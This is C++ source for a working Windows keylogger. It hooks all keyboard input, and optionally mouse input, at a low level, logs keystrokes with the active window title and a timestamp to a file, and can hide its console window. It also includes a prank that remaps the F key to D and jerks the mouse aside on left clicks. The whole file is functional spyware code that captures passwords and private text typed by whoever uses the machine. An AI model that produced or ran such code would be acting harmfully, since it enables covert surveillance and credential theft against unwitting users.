//#pragma GCC diagnostic ignored "-Wreturn-type"
//#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <filesystem>


class KeyLogger {
private:
	bool visible; // defines whether the window is visible or not
	//mapping of special keys to friendly representation
	const std::map<int, std::string> keyname{
	{VK_BACK, 		"[BACKSPACE]" },
	{VK_RETURN,		"[ENTER]" },//"\n" },
	{VK_SPACE,		"[SPACE]" },
	{VK_TAB,		"[TAB]" },
	{VK_SHIFT,		"[SHIFT]" },
	{VK_LSHIFT,		"[LSHIFT]" },
	{VK_RSHIFT,		"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,		"[ALT]" },
	{VK_LWIN,		"[LWIN]" },
	{VK_RWIN,		"[RWIN]" },
	{VK_ESCAPE,		"[ESCAPE]" },
	{VK_END,		"[END]" },
	{VK_HOME,		"[HOME]" },
	{VK_LEFT,		"[LEFT]" },
	{VK_RIGHT,		"[RIGHT]" },
	{VK_UP,			"[UP]" },
	{VK_DOWN,		"[DOWN]" },
	{VK_PRIOR,		"[PG_UP]" },
	{VK_NEXT,		"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
	};
	HHOOK hKeybdHook;    //will point to handle to the KEYBOARD hook procedure.
	HHOOK hMouseHook;    //will point to handle to the MOUSE hook procedure.
	std::string logfile_name_;
	std::ofstream output_file;	//handle to log file
	int mouse_direction_modifier;

	bool OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam)
 	{
		// for WH_KEYBOARD_LL, non zero nCode must be HC_ACTION ?
		if (wParam == WM_KEYDOWN)
		{
			LPKBDLLHOOKSTRUCT pKeybdHookParam;
			pKeybdHookParam = (LPKBDLLHOOKSTRUCT)lParam;
			/*
				FUNNY ADDTITION HAHA
				simulating keybd events if some condition is met -
					simulating 'D' press upon press on 'F'
					also, stopping hook chain so this key is not actually pressed (:
			*/
			if (pKeybdHookParam->vkCode == 0x46) //vitual key-code of 'F' key.
			{
				// Simulate a key press on 'D' instead
				keybd_event(0x44,                       // the key 'D'
					0x0,                        // i-net says doesn't matter
					KEYEVENTF_EXTENDEDKEY,  // \?
					0);                          	// not needed
				// Simulate a key release
				keybd_event(0x44,                       // the key 'D'
					0x0,	                    	// i-net says doesn't matter
					KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,  // If specified, the key is being released. If not specified, the key is being depressed.
					0);                           	// not needed
				return false;	// will stop hook chain
			}
			//continue to normal processing of keylogger
			else
			{
				// save to file
				this->SaveKeybd(pKeybdHookParam->vkCode);
			}
		}
		return true;
	}

	bool OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam)
	{
		LPMSLLHOOKSTRUCT pMouseHookParam;
		pMouseHookParam = (LPMSLLHOOKSTRUCT)lParam;
		if (wParam == WM_RBUTTONDOWN) {	//if event is of a left mouse button depressed -
			this->SaveMouse(pMouseHookParam->pt);
		}
		/*
		FUNNY ADDTITION HAHA
		simulating mouse events
			simulating movement some pixels aside upon leftclick
			also, passing leftclick press to hook chain only after moving the mouse (:
		*/
		else if (wParam == WM_LBUTTONDOWN)
		{
			mouse_event(MOUSEEVENTF_MOVE,
				50 * this->mouse_direction_modifier,	// some pixels left or right, depending on sign of direction_modifier
				0, 0, 0);				// not needed to change
			this->mouse_direction_modifier = -mouse_direction_modifier;	// alternate sign of direction_modifier
		}
		return true;
	}

	bool FormatLogForNewActiveWindow(HWND window, char* to_log)
 	{
		static char lastwindow[256] = "";	//will save window_title of last active window. compared to current window_title.
		char window_title[256];
		GetWindowTextA(window, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			//TODO: check length of inserted strings (secure from buffer overflow)
			snprintf(to_log, 200,"\n[Time: %s | Window: %s ]", s, window_title);
			return 1;
		}
		return 0;
	}

	int SaveKeybd(int keycode)
	{
		std::stringstream output;
		HWND foreground = GetForegroundWindow();
		DWORD threadID;
		HKL layout = NULL;

		if (foreground)
		{
			//make log title
			char title[300];
			if (this->FormatLogForNewActiveWindow(foreground, title)) 
			{
				output << title << std::endl;
			}
			output << " - KEYBD PRSS: ";

			// get keyboard layout of thread running the window
			threadID = GetWindowThreadProcessId(foreground, NULL);
			layout = GetKeyboardLayout(threadID);
		}

		// process keycode
		if (this->keyname.find(keycode) != this->keyname.end())		// if is special Key
		{
			output << this->keyname.at(keycode);
		}
		else
		{
			// map virtual key according to keyboard layout
			char key = MapVirtualKeyExA(keycode, MAPVK_VK_TO_CHAR, layout);

			// check for shift/caps modifiers
			// check for caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
			// check shift key (inverses an active caps lock)
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
				|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
			{
				lowercase = !lowercase;
			}

			// tolower converts it to lowercase properly
			if (!lowercase)
			{
				key = tolower(key);
			}

			output << char(key);
		}
		// instead of opening and closing file handlers every time, keep file open and flush.
		this->output_file << output.str();
		this->output_file.flush();	// TODO: add periodic close + reopen to save the file.

		std::cout << output.str() << std::endl;

		return 0;
	}

	int SaveMouse(POINT point)
	{
		std::stringstream output;
		HWND foreground = GetForegroundWindow();

		if (foreground)
		{
			//make log title
			char title[300];
			if (this->FormatLogForNewActiveWindow(foreground, title)) 
			{
				output << title << std::endl;
			}
			output << " - MOUSE RCLK: ";
		}

		char coords[20];
		snprintf(coords, 20, "(%ld, %ld)", point.x, point.y);	//TODO: check length of inserted strings (secure from buffer overflow)
		output << coords << std::endl;

		// instead of opening and closing file handlers every time, keep file open and flush.
		this->output_file << output.str();
		this->output_file.flush();	// TODO: add periodic close + reopen to save the file.

		std::cout << output.str();

		return 0;
	}


	static LRESULT __stdcall LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT __stdcall LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);

public:
	// Constructor
	// dynamic memory allocation for 'logfile_name_' done directly in initializer list.
	// no need to release memory, std::string takes care of this.
	KeyLogger(const char* output_dir, bool visible = false)
		:logfile_name_(std::string(output_dir) + std::string("logfile.log")), visible(visible)
	{	
		this->mouse_direction_modifier = 1; // direction - right
		if (this->visible) {
			ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
		}
		else {
			ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
		}
		
		// setting hooks
		this->SetLowLvLKeybdHook();
		//this->SetLowLvlMouseHook();

		// open output file in append mode
		print_logfile_name();
		this->output_file.open(this->logfile_name_, std::ios_base::app);
	}

	void print_logfile_name() {
		std::cout << "Logging output to: " << this->logfile_name_ << std::endl;
	}

	// destructor
	// - freeing/releasing object resources, undoing changes. 
	~KeyLogger()
	{
		// releasing dynamically allocated memory for private member char* logfile_name_	// NO NEED CUZ CHANGED TO STD::STRING
		//delete[] logfile_name_;

		// releasing hooks
		this->ReleaseLowLvlKeybdHook();
		this->ReleaseLowLvlMouseHook();
		output_file.close(); 	// closing open handle to log file
	}

	// hook SETTER functions
	void SetLowLvLKeybdHook()
	{
		//this->hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLvlKeybdHookCallback, NULL, 0);
		if (!(this->hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLvlKeybdHookCallback, NULL, 0)))
		{
			LPCWSTR lpText = L"Failed to install keyboard hook!";
			LPCWSTR lpCaption = L"Error";
			MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
		}
		
	}
	void SetLowLvlMouseHook()
	{
		//this->hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLvlMouseHookCallback, NULL, 0);
		if (!(this->hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLvlMouseHookCallback, NULL, 0)))
		{
			LPCWSTR lpText = L"Failed to install mouse hook!";
			LPCWSTR lpCaption = L"Error";
			MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
		}
		
	}

	// hook RELEASER functions
	void ReleaseLowLvlKeybdHook()
	{
		if (this->hKeybdHook) {
			UnhookWindowsHookEx(this->hKeybdHook);
		}
	}
	void ReleaseLowLvlMouseHook()
	{
		if (this->hMouseHook) {
			UnhookWindowsHookEx(this->hMouseHook);
		}
	}
};


//KeyLogger* KeyLogger_obj = new KeyLogger(".\\Keylogger.log");
KeyLogger* KeyLogger_obj;


LRESULT CALLBACK KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) {    // do not process the message if nCode less than 0
		return CallNextHookEx(0, nCode, wParam, lParam);
	}

	bool call_next = KeyLogger_obj->OnLLKeybdHook(nCode, wParam, lParam);
	//bool call_next = this->OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam);
	if (call_next)
	{
		return CallNextHookEx(0, nCode, wParam, lParam);
	}

}
LRESULT CALLBACK KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam)

{
	if (nCode < 0) // do not process the message if nCode less than 0
	{
		return CallNextHookEx(0, nCode, wParam, lParam);
	}

	bool call_next = KeyLogger_obj->OnLLMouseHook(nCode, wParam, lParam);
	//bool call_next = this->OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam);
	if (call_next)
	{
		return CallNextHookEx(0, nCode, wParam, lParam);
	}
}



int main(int argc, char* argv[])
{
	// output_dir defaults to current directory, if not specified.
	const char* output_dir= "/.";
	if (argc > 1)
	{
		output_dir = argv[1];
	}

	// input validataion of cmdline args
	std::filesystem::path p(argv[1]);
	if (!(std::filesystem::exists(p) && std::filesystem::is_directory(p))) {
		std::cerr << p << " - is not a valid directory." << std::endl;
		std::cerr << "Usage:\r\n" << argv[0] << " <output_directory>" << std::endl;
		return 1;
	}

	KeyLogger_obj = new KeyLogger(output_dir, 1);

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// deleting object to avoid memory leak if gone out of scope.	
	// might still leak if exception occurs between creation and deletion. deal with it later. 
	delete KeyLogger_obj;

	return 0;
}